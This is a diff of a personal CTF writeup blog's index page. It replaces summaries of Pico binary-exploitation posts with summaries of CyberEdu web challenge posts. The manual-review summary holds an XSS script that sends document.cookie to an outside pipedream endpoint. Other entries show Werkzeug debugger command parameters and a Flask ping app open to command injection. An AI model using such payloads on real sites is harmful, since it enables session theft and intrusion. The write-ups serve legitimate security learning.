@@ -11,7 +11,7 @@
 <meta name="description" content="">
 <meta name="author" content="">
 <link rel="canonical" href="https://irinasusca.github.io/writeup-blog/">
-<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
@@ -100,7 +100,9 @@
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -145,87 +147,177 @@
 </header>
 <main class="main"> 
 
-<article class="post-entry"> 
+
+
+<article class="post-entry"
+  data-tags="cyberedu web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Pico Function Overwrite Writeup
+    <h2 class="entry-hint-parent">CyberEdu slightly-broken Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Story telling class 2/2 Additional details will be available after launching your challenge instance.
-Upon a quick check, we see that the challenge is a 32-bit binary, and that we can trigger a SEGFAULT. It might be a buffer overflow, but the challenge doesn’t necessarily hint that, so let’s inspect it further.
-Also NX is enabled, so let’s keep that in mind.
-The first input string is not susceptible to a buffer overflow, but something interesting happens on the second scanf. We read two %d (ints), but only one destination for them (&amp;number1).
+    <p>Challenge overview For this one, only contact admins for socialising with them. Do not contact them for errors at this challenge.
+Identifying the vulnerabilities We bump into some errors, but look at this section of a response:
+This is part of the Flask/Werkzeug’s interactive debugger, and we see it because of the error.
+To execute a command, we need the params __debugger__: &#39;yes&#39;, cmd: &#39;pinauth&#39;, pin: pin, s: SECRET as json. In a GET request, because Workzeug uses GETs not POST.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-11-23 21:08:35 +0200 EET'>November 23, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to Pico Function Overwrite Writeup" href="https://irinasusca.github.io/writeup-blog/posts/functionoverwrite-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu slightly-broken Writeup" href="https://irinasusca.github.io/writeup-blog/posts/slightlybroken-writeup/"></a>
 </article>
 
-<article class="post-entry"> 
+<article class="post-entry"
+  data-tags="cyberedu web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Pico Stack Cache Writeup
+    <h2 class="entry-hint-parent">CyberEdu downloader-v1 Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Undefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. Analyse this program to identify how you can get to the flag.
-At first glance, the vuln looks like a 32-bit executable with a buffer overflow vulnerability.
-Analyzing the binary, we come across some interesting funtions, UnderConstruction and win.
-After a quick checksec, we find vuln has both NX and a stack canary enabled. So we can probably find a way to leak the stack canary using the UnderConstruction function.
+    <p>Challenge overview Don’t you find it frustrating when you have uploaded some files on a website but you’re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
+Identifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains “GET ME”. Using gobuster, we find a /uploads/ directory. There’s a /uploads/index.html, but it’s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image’s link?
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-11-19 21:09:36 +0200 EET'>November 19, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to Pico Stack Cache Writeup" href="https://irinasusca.github.io/writeup-blog/posts/stackcache-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu downloader-v1 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"></a>
 </article>
 
-<article class="post-entry"> 
+<article class="post-entry"
+  data-tags="cyberedu web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Pico Babygame02 Writeup
+    <h2 class="entry-hint-parent">CyberEdu manual-review Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Break the game and get the flag. Welcome to BabyGame 02! Navigate around the map and see what you can find!
-After analyzing the binary and renaming the variables, we notice we have a player struct/array consisting of the player y, player x.
-Immediately after that, we have the map matrix.
-From the main function, by solving the puzzle, which can be easily achieved by using the special command p we “win”. And with the special command l we can replace the @ player character with a char (spoiler, it can be any byte of our liking, not necessarily a char).
+    <p>Challenge overview For any coffe machine issue please open a ticket at the IT support department.
+Flag format: ctf{sha256}
+Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
+Identifying the vulnerabilities This look familiar?
+Alright, so XSS is confirmed, and we have two types of cookies.
+First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
+I sent a &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-11-19 21:08:35 +0200 EET'>November 19, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to Pico Babygame02 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/babygame02-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu manual-review Writeup" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"></a>
 </article>
 
-<article class="post-entry"> 
+<article class="post-entry"
+  data-tags="cyberedu web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Pico Babygame03 Writeup
+    <h2 class="entry-hint-parent">CyberEdu broken-login Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Break the game and get the flag. Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don’t have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you’ll have to figure your way around the map.
-After analyzing the binary and renaming the variables, we notice we have a player struct/array consisting of the player y, player x and player lives.
+    <p>Challenge overview Intern season is up again and our new intern Alex had to do a simple login page. Not only the login page is not working properly, it is also highly insecure…
+Identifying the vulnerabilities This is how our POST requests are sent.
+Then, another GET is made: GET /auth?username=67616761&amp;password=9748ae63d43e39bb35e3060fbde9f34c731d4173f8b579441404bed6f485644335fca004f512c6602f77549e0aa5e23fec9a8b3979d61a73b9eb414ee9a27ca6.
+That’s a sha512 hash. I’m thinking, why don’t we try rockyou.txt? We can just sha512 each entry, send it, and see if we get a response with a content length higher than 0. That failed though.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-11-10 21:08:35 +0200 EET'>November 10, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to Pico Babygame03 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/babygame03-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu broken-login Writeup" href="https://irinasusca.github.io/writeup-blog/posts/brokenlogin-writeup/"></a>
 </article>
 
-<article class="post-entry"> 
+<article class="post-entry"
+  data-tags="cyberedu web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Pico Handoff Writeup
+    <h2 class="entry-hint-parent">CyberEdu file-crawler Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview The first vuln we encounter in handoff is that it doesn’t disable NX. (Basically, this means that we can execute shellcode on the stack!)
-We are presented with a menu with 3 options:
-Add a recipient Send a message to a recipient Exit Upon trying to exit, we are prompted to give our feedback.
-Identifying the vulnerability Immediately after decompiling the binary, we notice a buffer overflow in its feedback buffer. We can also see that the value at feedback[7] gets turned to \0. However, the feedback buffer overflow is way too small for us to do anything with it, so our best bet is to find another buffer and jmp to it.
+    <p>I was stuck between starting to study heap properly or keep doing web challenges, and I guess here we are.
+Challenge overview Find the vulnerability and get the flag. The flag is located in a temporary folder.
+Identifying the vulnerabilities I inspected the original GET request with burp:
+Since the flag is located in a “temporary folder”, my first guess was /tmp/flag. I tried /local, and we get a TRY HARDER message.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-11-10 21:08:35 +0200 EET'>November 10, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to Pico Handoff Writeup" href="https://irinasusca.github.io/writeup-blog/posts/handoff-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu file-crawler Writeup" href="https://irinasusca.github.io/writeup-blog/posts/filecrawler-writeup/"></a>
+</article>
+
+<article class="post-entry"
+  data-tags="cyberedu web "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu ping-station Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Just another ping service to audit.
+We get an app(1).py file to look at.
+from flask import Flask, render_template, url_for, request, redirect import subprocess import re import string app = Flask(__name__) def is_valid_ip(ip): ipv = re.match(r&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;,ip) return bool(ipv) @app.route(&#39;/&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;]) def index(): if request.method == &#39;POST&#39;: ip = request.form[&#39;content&#39;] if (is_valid_ip(ip)==True): for i in range(0,2): return &#39;&lt;pre&gt;&#39;&#43;subprocess.check_output(&#34;ping -c 4 &#34;&#43;ip,shell=True).decode()&#43;&#39;&lt;/pre&gt;&#39; break else: return&#34;That&#39;s not a valid IP&#34; else: return render_template(&#39;index.html&#39;) if __name__ == &#34;__main__&#34;: app.run(host = &#34;0.0.0.0&#34;) Identifying the vulnerabilities Looking at that &#34;ping -c 4 &#34;&#43;ip,shell=True), if we manage to smuggle a command past this is_valid_ip function, it will get executed.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu ping-station Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pingstation-writeup/"></a>
+</article>
+
+<article class="post-entry"
+  data-tags="cyberedu web "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu jargon Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
+Identifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span>&nbsp;·&nbsp;<span>7 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu jargon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"></a>
+</article>
+
+<article class="post-entry"
+  data-tags="materials "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Mobile rev
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Why Since these mobile reverse engineering challs have really gained traction from what I’ve seen, and since I only ever tried one challenge on my Windows machine before, I think it’s time to set everything up and write down some notes, since rocsc is tomorrow and I’d like to at least pretend to be prepared for this.
+Set up I stumbled upon these wonderful docs here. I will be installing this on my main ubuntu machine and that’s what I recommend. And don’t forget to install apktool from their docs.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-08 00:00:00 +0000 UTC'>January 8, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Mobile rev" href="https://irinasusca.github.io/writeup-blog/posts/mobile/"></a>
+</article>
+
+<article class="post-entry"
+  data-tags="materials "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Serialization and Deserialization
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Why I decided to get more into this subject because of the challenge jargon. I was struggling with AIs and it was really getting on my nerves, because I felt I didn’t really understand what was going on. So I decided to write a little article about this, to make myself fully grasp serialization, deserialization and the subset of vulnerabilities that may come with them. So, let’s get into it.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-08 00:00:00 +0000 UTC'>January 8, 2026</span>&nbsp;·&nbsp;<span>6 min</span></footer>
+  <a class="entry-link" aria-label="post link to Serialization and Deserialization" href="https://irinasusca.github.io/writeup-blog/posts/serialization/"></a>
+</article>
+
+<article class="post-entry"
+  data-tags="cyberedu web "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu reccon Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview I heard you like memes, so we had a surprise for you. Enjoy !!
+Today is a big day. Finally solving a non-pwn challenge! Let’s see if I can still remember how burpsuite works.
+Identifying the vulnerabilities First I ran ffuf -u http://34.159.240.221:31548/FUZZ -w /usr/share/wordlists/dirb/common.txt, but only found .hta, .htaccess, .htpasswd and index.php.
+This is all. I ffufed for /images_FUZZ too, but nothing.
+I did exiftool, strings, looked at it in hex, steghide, stegseek, just about everything.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-07 00:00:00 +0000 UTC'>January 7, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu reccon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/reccon-writeup/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="prev" href="https://irinasusca.github.io/writeup-blog/page/7/">
       «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="https://irinasusca.github.io/writeup-blog/page/9/">Next&nbsp;&nbsp;»
     </a>
   </nav>
 </footer>
